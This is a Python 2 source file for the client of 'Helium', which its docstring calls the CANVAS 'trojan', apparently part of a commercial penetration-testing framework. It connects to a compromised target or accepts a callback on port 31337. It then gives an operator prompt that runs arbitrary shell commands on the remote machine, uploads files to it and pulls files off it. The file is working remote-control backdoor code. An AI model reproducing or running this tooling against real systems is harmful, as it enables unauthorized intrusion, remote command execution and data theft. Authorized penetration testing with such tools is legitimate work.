#! /usr/bin/env python

"""
client.py - main file for helium client and interface.

Helium is the CANVAS "trojan" - it runs on the target as a process and acts on
the behalf of the CANVAS user to run exploits and do that sort of thing.

"""
import getopt
import sys
import socket
import cPickle
from other import *
import os.path
    
def secondword(line):
    """line has a \n on it so we strip that off too"""
    return "".join(line.split(" ")[1:])[:-1]

class heliumclient:
    def __init__(self):
        self.connecthost=""
        self.connectport=None
        self.protocol="tcp"
        self.port=31337
        self.target=""
        self.callback=0
        self.resenders=[]
        self.requestidsACK={}
        self.responsesSeen={}
        self.responseids={}
        self.sendlock=RLock()
        self.fileGets={}
        self.fileMutex=RLock()
        return

    def log(self,line):
        print line
        
    def setTarget(self,target):
        self.target=target
        return
    
    def setPort(self,port):
        self.port=port
        return
    
    def setProto(self,protocol):
        self.protocol=protocol
        return

    def hasAck(self,id):
        """checks for an ack of id == id """
        #self.log("looking for ack: %d"%id)
        if id in self.requestidsACK:
            return 1
        return 0
    
    def openSocket(self):
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.setsockopt(socket.SOL_SOCKET,socket.SO_REUSEADDR,1)
        listenhost=""
        listenport=self.port
        try:
            s.bind((listenhost, listenport))
            s.listen(5)
        except:
            #could not listen!
            return 0
        self.listensock=s
        
    def connectToServer(self):
        if self.callback:
            self.openSocket()
            self.sock=self.listensock.accept()
        else:
            #first make socket connection to target
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            try:
                s.connect((self.target, self.port))
            except:
                self.log("Could not connect to target: %s:%d"%(self.target,self.port))
                return 0
            self.sock=s
        return 1
        
    def send(self,myrequest):
        #self.log("Sending request #%d"%myrequest.id)
        #1 for binary. Will this break at 2.3?
        self.sendlock.acquire()
        #self.log("Sendlock acquired")
        p_request=cPickle.dumps(myrequest,1)
        #self.log("Sending %d bytes"%len(p_request))
        size=big_order(len(p_request))
        try:
            reliableSend(self.sock,size)
            reliableSend(self.sock,p_request)
        except socket.error:
            self.log("Remote end closed our connection!")
            #we're done here...don't loop and keep doing this
            sys.exit(1)
        #self.log("Sendlock released")
        self.sendlock.release()
        return
    
    def queueForSend(self,myrequest):
        #tcp, no queue
        if myrequest.type=="ack":
            self.send(myrequest)
        else:
            #self.log("Queing for send")
            r=resender(myrequest,self)
            while len(self.resenders)>10:
                time.sleep(0.2)
            self.resenders.append(r)
            r.start()
        return
    
    def removeResender(self,r):
        #self.log("Removing our resender...%d"%r.request.id)
        self.resenders.remove(r)
    
    def interface(self):
        while 1:
            print "Command: ",
            data=sys.stdin.readline()
            print "\r",

            firstword=data.split(" ")[0].upper().strip()
            #self.log("Doing: <%s> %s"%(firstword,data))
            if firstword=="?":
                print "PUT, GET, ?, and anything else is a command"
                
            elif firstword=="PUT":
                try:
                    self.log("Acquiring mutex")
                    self.fileMutex.acquire()
                    filename=secondword(data)
                    fd=open(filename,"rb")
                    fd.seek(0,2)
                    #what is the end of the file?
                    totalsize=fd.tell()
                    fd.seek(0,0) #get back to the beginning
                    self.log("Sending %d bytes"%totalsize)
                except:
                    self.log("Couldn't open %s for reading."%filename)
                    self.log("Releasing Mutex")
                    self.fileMutex.release()
                    continue
                #if we got here, we opened the file for reading
                done=0
                offset=0
                while not done:
                    #low number in case MTU is small
                    data=fd.read(500)
                    if len(data)<500:
                        self.log("Done sending file %s"%filename)
                        fd.close()
                        done=1
                
                    #BUGBUG: if the putrequest fails, then we continue to send
                    #it. Not good. We could have sent many packets before we
                    #even get the error. This whole thing should be it's own
                    #thread. We should check the open before we start sending it.
                    #Fix later. 
                    self.log("putRequest %s %s %s %s"%(filename,offset,len(data),totalsize))
                    myrequest=putRequest(filename,offset,data,totalsize)
                    time.sleep(0.002) #gah.
                    self.queueForSend(myrequest)
                    #self.log("Sent offset %d for file %s"%(offset,myrequest.filename))
                    offset+=len(data)
                self.log("Releasing mutex")
                self.fileMutex.release()
          
            
            elif firstword=="GET":
                filename=secondword(data)
                myreq=fileRequest(filename)
                fd=open(os.path.basename(filename),"wb")
                #fd, totalsize
                self.fileGets[myreq.id]=[fd,0]
                self.queueForSend(myreq)
                
            elif firstword=="CD":
                if len(data.split(" "))==0:
                    continue
                    
                myreq=cwdRequest(secondword(data))
                self.queueForSend(myreq)
            elif firstword=="EXIT":
                self.log("Exiting.")
                #we're done
                sys.exit(1)
            else:
                #run it as a command
                #strip \n
                myreq=commandRequest(data[:-1])
                self.queueForSend(myreq)

    def getResponse(self):
        #self.log("Inside getResponse")
        data=reliableRecv(self.sock,4)
        size=str2bigendian(data)
        #self.log("Receiving response of length %d"%size)
        data=reliableRecv(self.sock,size)
        #self.log("data length=%d"%len(data))
        #self.log("data=%s"%prettyprint(data))
        myresponse=cPickle.loads(data)
        return myresponse
    
    def handleResponse(self,myresponse):
        if myresponse.type=="commandresponse":
            self.log("Command Response:\n%s"%myresponse.data)
        elif myresponse.type=="errorresponse":
            self.log("Message from server: %s"%myresponse.message)
        elif myresponse.type=="fileresponse":
            self.fileMutex.acquire()
            self.log("received data packet")
            if myresponse.requestid not in self.fileGets:
                self.log("Unknown file get id %d"%myresponse.requestid)
                self.fileMutex.release()
                return
            fd=self.fileGets[myresponse.requestid][0]
            self.log("seeking to %d"%myresponse.offset)
            fd.seek(myresponse.offset)
            fd.write(myresponse.data)
            self.fileGets[myresponse.requestid][1]+=len(myresponse.data)
            if self.fileGets[myresponse.requestid][1]==myresponse.totalsize:
                #we're done!
                fd.close()
                del self.fileGets[myresponse.requestid]
            self.fileMutex.release()                
        else:
            self.log("Unknown type: %s"%myresponse.type)
        return
            
    def recv(self,sock):
        #self.log("Receiving data!")
        myresponse=self.getResponse()
        if myresponse.type!="ack":
            #self.log("Acking %d"%myresponse.id)
            self.queueForSend(responseack(myresponse.id))
            self.handleResponse(myresponse)
        else:
            #handle acks
            #self.log("Received ACK: %d"%myresponse.id)
            self.requestidsACK[myresponse.id]=1
            #self.log("requests=%d"%len(self.resenders))
        
    def run(self):
        #open listening ports
        #try known outbound hosts on all known outbound protocols
        #protocols: ipv6, ack packets, udp, icmp, tcp 
        if self.callback:
            if not self.openSocket():
                self.log("Could not open socket to host %s:%d"%(self.target,self.port))
                sys.exit(1)
        else:
            if not self.connectToServer():
                sys.exit(1)
        self.log("Connected.")
        self.reciever=reciever(self.sock,self)
        self.reciever.start()
        self.interface()
        #now we have self.sock set to our connection
        #self.enableEncryption()
        
        return
    
def usage():
    """usage for helium client"""
    print "client.py -t target -p port -l listenport"
    sys.exit(1)
    
#this stuff happens.
if __name__ == '__main__':
    
    import signal
    signal.signal (signal.SIGINT, signal.SIG_DFL)
    
    try:
        (opts,args)=getopt.getopt(sys.argv[1:],"t:p:l:")
    except getopt.GetoptError:
        #print help
        usage()
    h = heliumclient()        
    targetport=0
    i=0
    istest=0
    target=None
    for o,a in opts:
        if o in ["-t"]:
            target=a
            h.setTarget(target)
            i+=1
        if o in ["-p"]:
            targetport=a
            h.setPort(int(targetport))



    #h.setProto("tcp")
    h.run()
    